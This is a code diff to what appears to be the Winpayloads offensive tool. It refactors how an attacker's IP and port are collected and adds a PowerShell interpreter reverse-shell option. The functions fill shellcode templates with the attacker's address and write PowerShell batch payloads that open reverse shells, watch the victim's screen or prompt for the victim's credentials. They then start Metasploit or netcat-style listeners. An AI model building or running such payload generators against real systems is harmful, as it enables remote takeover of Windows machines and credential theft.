@@ -2,15 +2,15 @@ from main import *
 from payloadextras import *
 from startmetasploit import *
 from generatepayload import *
+from sockets import *
 
 payloaddir = '/etc/winpayloads'
 
-def reversePayloadGeneration(payloadchoice,payloadname):
+def reverseIpAndPort(port):
     portnum = raw_input(
-        '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + '4444' + t.normal))
-    if len(portnum) == 0:
-        portnum = 4444
-
+        '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + port + t.normal))
+    if len(portnum) is 0:
+        portnum = port
     IP = FUNCTIONS().CheckInternet()
     ipaddr = raw_input(
         '\n[*] Press Enter To Get Local Ip Automatically(%s)\n[*] IP> '%(t.bold_green + IP + t.normal))
@@ -20,10 +20,16 @@ def reversePayloadGeneration(payloadchoice,payloadname):
         print t.bold_red + 'Error Getting Ip Automatically' + t.normal
         ipaddr = raw_input(
             '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
+    return (portnum,ipaddr)
+
+
+def reversePayloadGeneration(payloadchoice,payloadname):
+    portnum,ipaddr = reverseIpAndPort('4444')
     try:
         ip1, ip2, ip3, ip4 = ipaddr.split('.')
         iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
-    except:
+    except Exception as E:
+        print E
         print t.bold_red + '[*] Error in IP Syntax'
         sys.exit(1)
     try:
@@ -33,7 +39,11 @@ def reversePayloadGeneration(payloadchoice,payloadname):
         sys.exit(1)
     shellcode = payloadchoice % (iphex, porthex)
     print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
-    ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'nclistener')
+    print payloadname
+    if payloadname == "Windows_Reverse_Shell":
+        ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'nclistener')
+    else:
+        ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'reverse')
     GeneratePayload(ez2read_shellcode,payloadname,shellcode)
     startRevMetasploit(portnum)
     raise KeyboardInterrupt
@@ -57,20 +67,7 @@ def bindPayloadGeneration(payloadchoice,payloadname):
     startBindMetasploit(bindport,bindip)
 
 def httpsPayloadGeneration(payloadchoice,payloadname):
-    portnum = raw_input(
-        '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + '443' + t.normal))
-    if len(portnum) is 0:
-        portnum = 443
-
-    IP = FUNCTIONS().CheckInternet()
-    ipaddr = raw_input(
-        '\n[*] Press Enter To Get Local Ip Automatically(%s)\n[*] IP> '%(t.bold_green + IP + t.normal))
-    if len(ipaddr) == 0:
-        ipaddr = IP
-    if not IP:
-        print t.bold_red + 'Error Getting Ip Automatically' + t.normal
-        ipaddr = raw_input(
-            '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
+    portnum,ipaddr = reverseIpAndPort('443')
     try:
         porthex = struct.pack('<h', int(portnum))
     except:
@@ -102,21 +99,12 @@ def dnsPayloadGeneration(payloadchoice,payloadname):
     GeneratePayload(ez2read_shellcode,payloadname,shellcode)
     startHttpsMetasploit(portnum,DNSaddr)
 
+def reversePowerShellInterpreterGeneration(payloadchoice,payloadname):
+    portnum,ipaddr = reverseIpAndPort('4444')
+    startSocket(ipaddr, portnum)
 
 def reversePowerShellGeneration(payloadchoice,payloadname):
-    portnum = raw_input(
-        '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + '4444' + t.normal))
-    if len(portnum) is 0:
-        portnum = 4444
-    IP = FUNCTIONS().CheckInternet()
-    ipaddr = raw_input(
-        '\n[*] Press Enter To Get Local Ip Automatically(%s)\n[*] IP> '%(t.bold_green + IP + t.normal))
-    if len(ipaddr) == 0:
-        ipaddr = IP
-    if not IP:
-        print t.bold_red + 'Error Getting Ip Automatically' + t.normal
-        ipaddr = raw_input(
-            '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
+    portnum,ipaddr = reverseIpAndPort('4444')
 
     shellcode = payloadchoice % (ipaddr,portnum,"|%{0}")
     powershellbatfile = open('%s/%s.bat'%(payloaddir, payloadname),'w')
@@ -127,19 +115,7 @@ def reversePowerShellGeneration(payloadchoice,payloadname):
     raise KeyboardInterrupt
 
 def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
-    portnum = raw_input(
-        '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + '4444' + t.normal))
-    if len(portnum) is 0:
-        portnum = 4444
-    IP = FUNCTIONS().CheckInternet()
-    ipaddr = raw_input(
-        '\n[*] Press Enter To Get Local Ip Automatically(%s)\n[*] IP> '%(t.bold_green + IP + t.normal))
-    if len(ipaddr) == 0:
-        ipaddr = IP
-    if not IP:
-        print t.bold_red + 'Error Getting Ip Automatically' + t.normal
-        ipaddr = raw_input(
-            '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
+    portnum,ipaddr = reverseIpAndPort('4444')
 
     shellcode = payloadchoice % (ipaddr,portnum)
     powershellbatfile = open('%s/%s.bat'%(payloaddir, payloadname),'w')
@@ -151,19 +127,7 @@ def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     raise KeyboardInterrupt
 
 def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
-    portnum = raw_input(
-        '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + '4444' + t.normal))
-    if len(portnum) is 0:
-        portnum = 4444
-    IP = FUNCTIONS().CheckInternet()
-    ipaddr = raw_input(
-        '\n[*] Press Enter To Get Local Ip Automatically(%s)\n[*] IP> '%(t.bold_green + IP + t.normal))
-    if len(ipaddr) == 0:
-        ipaddr = IP
-    if not IP:
-        print t.bold_red + 'Error Getting Ip Automatically' + t.normal
-        ipaddr = raw_input(
-            '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
+    portnum,ipaddr = reverseIpAndPort('4444')
 
     shellcode = payloadchoice % (ipaddr,portnum)
     powershellbatfile = open('%s/%s.bat'%(payloaddir, payloadname),'w')
